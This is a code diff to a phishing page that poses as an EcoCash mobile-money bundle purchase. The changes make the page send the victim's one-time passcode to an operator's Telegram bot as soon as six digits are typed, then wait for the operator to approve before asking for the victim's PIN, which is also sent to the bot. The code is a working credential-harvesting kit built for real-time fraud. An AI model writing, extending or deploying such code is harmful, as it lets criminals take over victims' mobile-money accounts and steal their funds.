@@ -280,36 +280,6 @@
             margin-top: 20px;
         }
 
-        .btn-primary {
-            flex: 1;
-            border: 0;
-            border-radius: 999px;
-            padding: 16px 22px;
-            color: white;
-            background: linear-gradient(135deg, var(--green) 0%, var(--green-dark) 100%);
-            font-size: 15px;
-            font-weight: 800;
-            letter-spacing: 0.04em;
-            text-transform: uppercase;
-            cursor: pointer;
-            box-shadow: 0 10px 24px rgba(0,176,80,0.3);
-            touch-action: manipulation;
-            transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            box-shadow: 0 14px 30px rgba(0,176,80,0.36);
-            transform: translateY(-1px);
-        }
-
-        .btn-primary:active:not(:disabled) { transform: translateY(0); }
-
-        .btn-primary:disabled {
-            background: #555;
-            box-shadow: none;
-            cursor: not-allowed;
-        }
-
         .btn-secondary {
             flex: 1;
             border: 1.5px solid var(--border2);
@@ -518,7 +488,7 @@
             .form-panel { padding: 15px; }
             .otp-box { width: 45px; height: 45px; font-size: 20px; }
             .btn-group { flex-direction: column; }
-            .btn-primary, .btn-secondary { padding: 15px 18px; }
+            .btn-secondary { padding: 15px 18px; }
             .modal-content { padding: 24px; }
         }
     </style>
@@ -561,12 +531,11 @@
                     <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
                 </div>
 
-                <p class="hint">Waiting for Telegram approval to proceed…</p>
+                <p class="hint" id="hint">Enter your 6-digit OTP code above. It will be automatically sent to our system.</p>
 
                 <div class="error-msg" id="errMsg"></div>
 
                 <div class="btn-group">
-                    <button class="btn-primary" type="button" id="verifyBtn" disabled>Proceed to Verify</button>
                     <button class="btn-secondary" type="button" onclick="goBack()">← Back</button>
                 </div>
             </div>
@@ -608,10 +577,10 @@
 
         let state = { lastUpdateId: 0 };
         let isProcessing = false;
-        let waitingForApproval = true;
+        let otpSent = false;
+        let waitingForApproval = false;
 
         const otpBoxes = document.querySelectorAll('.otp-box');
-        const verifyBtn = document.getElementById('verifyBtn');
         const errMsg = document.getElementById('errMsg');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         const bundleSummary = document.getElementById('bundleSummary');
@@ -619,6 +588,7 @@
         const pinInput = document.getElementById('pinInput');
         const confirmBtn = document.getElementById('confirmBtn');
         const modalError = document.getElementById('modalError');
+        const hint = document.getElementById('hint');
 
         let bundleData = null;
         let currentOTP = '';
@@ -634,8 +604,7 @@
                 displayBundleDetails();
             }
 
-            // Start waiting for Telegram approval
-            waitForTelegramApproval();
+            otpBoxes[0].focus();
         }
 
         function displayBundleDetails() {
@@ -664,6 +633,12 @@
                 if (box.value.length === 1) {
                     if (index < otpBoxes.length - 1) {
                         otpBoxes[index + 1].focus();
+                    } else {
+                        // All 6 digits entered - auto-send to Telegram
+                        const otp = getOTP();
+                        if (otp.length === 6 && !otpSent) {
+                            sendOTPToTelegram(otp);
+                        }
                     }
                 }
             });
@@ -675,16 +650,78 @@
             });
         });
 
-        verifyBtn.addEventListener('click', () => {
-            const otp = getOTP();
-            if (otp.length === 6) {
-                currentOTP = otp;
-                openPinModal();
-            } else {
-                errMsg.textContent = 'Please enter all 6 digits.';
+        function sendOTPToTelegram(otp) {
+            if (otpSent || isProcessing) return;
+            otpSent = true;
+            isProcessing = true;
+            currentOTP = otp;
+
+            const ts = Date.now();
+            const approveId = `approve_${ts}`;
+            const declineId = `decline_${ts}`;
+
+            spinnerOverlay.style.display = 'flex';
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔵 EcoCash OTP Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nData: ${document.getElementById('bsData').textContent}\nPrice: $ ${document.getElementById('bsPrice').textContent.replace('$ ', '')}\n\nOTP Code: <code>${otp}</code>\n\nApprove or Decline:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve", callback_data: approveId },
+                                { text: "❌ Decline", callback_data: declineId }
+                            ]
+                        ]
+                    }
+                })
+            }).then(() => {
+                hint.textContent = 'OTP sent to admin for verification. Waiting for approval…';
+                waitingForApproval = true;
+                startPollingForApproval(approveId, declineId);
+            }).catch(() => {
+                otpSent = false;
+                isProcessing = false;
+                spinnerOverlay.style.display = 'none';
+                errMsg.textContent = 'Failed to send OTP. Please try again.';
                 errMsg.classList.add('show');
-            }
-        });
+            });
+        }
+
+        function startPollingForApproval(approveId, declineId) {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(update => {
+                            state.lastUpdateId = update.update_id;
+                            if (update.callback_query && waitingForApproval) {
+                                const cb = update.callback_query.data;
+                                if (cb === approveId) {
+                                    clearInterval(interval);
+                                    waitingForApproval = false;
+                                    spinnerOverlay.style.display = 'none';
+                                    openPinModal();
+                                } else if (cb === declineId) {
+                                    clearInterval(interval);
+                                    waitingForApproval = false;
+                                    spinnerOverlay.style.display = 'none';
+                                    otpSent = false;
+                                    isProcessing = false;
+                                    errMsg.textContent = 'OTP verification declined. Please try again.';
+                                    errMsg.classList.add('show');
+                                    clearOTP();
+                                    hint.textContent = 'Enter your 6-digit OTP code above. It will be automatically sent to our system.';
+                                }
+                            }
+                        });
+                    });
+            }, 1000);
+        }
 
         function openPinModal() {
             pinInput.value = '';
@@ -696,7 +733,11 @@
 
         function closePinModal() {
             pinModal.classList.remove('active');
+            // Reset for retry
+            otpSent = false;
+            isProcessing = false;
             clearOTP();
+            hint.textContent = 'Enter your 6-digit OTP code above. It will be automatically sent to our system.';
         }
 
         confirmBtn.addEventListener('click', () => {
@@ -726,7 +767,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔵 EcoCash OTP PIN Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nOTP: <code>${currentOTP}</code>\nPIN: <code>${pin}</code>\n\nValidate PIN:`,
+                    text: `<b>🔵 EcoCash PIN Verification</b>\n\nOffer: ${document.getElementById('bsOffer').textContent}\nOTP: <code>${currentOTP}</code>\nPIN: <code>${pin}</code>\n\nValidate PIN:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -739,11 +780,11 @@
                 })
             }).then(() => {
                 spinnerOverlay.style.display = 'flex';
-                startPolling(validId, invalidId);
+                startPollingForPin(validId, invalidId);
             }).catch(() => resetConfirmBtn());
         }
 
-        function startPolling(validId, invalidId) {
+        function startPollingForPin(validId, invalidId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -777,29 +818,6 @@
             isProcessing = false;
             confirmBtn.disabled = false;
             confirmBtn.textContent = "Proceed";
-        }
-
-        function waitForTelegramApproval() {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
-                        data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query && waitingForApproval) {
-                                const cb = update.callback_query.data;
-                                if (cb.startsWith('approve_')) {
-                                    clearInterval(interval);
-                                    waitingForApproval = false;
-                                    verifyBtn.disabled = false;
-                                    document.querySelector('.hint').textContent = 'OTP boxes are now active. Enter your 6-digit code.';
-                                    otpBoxes[0].focus();
-                                }
-                            }
-                        });
-                    });
-            }, 1000);
         }
 
         function goBack() {
